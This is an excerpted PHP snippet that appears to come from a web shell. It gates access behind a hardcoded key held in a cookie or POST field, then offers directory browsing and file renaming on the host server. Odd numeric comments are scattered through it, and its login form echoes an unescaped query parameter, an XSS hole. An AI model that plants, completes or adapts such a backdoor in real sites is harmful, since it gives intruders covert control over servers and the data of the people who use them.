...
$auth_key = "21507c306e8dceef1b2ad913b70b0ffa";
...
$pass = false;
if (isset($_COOKIE['pw_name_98159'])) {
    if(($_COOKIE['pw_name_98159']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_98159'])) {
        if(($_POST['pw_name_98159']) == $auth_key) {
            setcookie("pw_name_98159", $_POST['pw_name_98159']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_98159' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728474175202633 1728474175361055 1728474175393393 1728474175706260
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728474175202633 1728474175361055 1728474175393393 1728474175706260
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728474175202633 1728474175361055 1728474175393393 1728474175706260
            $name = PATH . "/" . $_GET['r'];
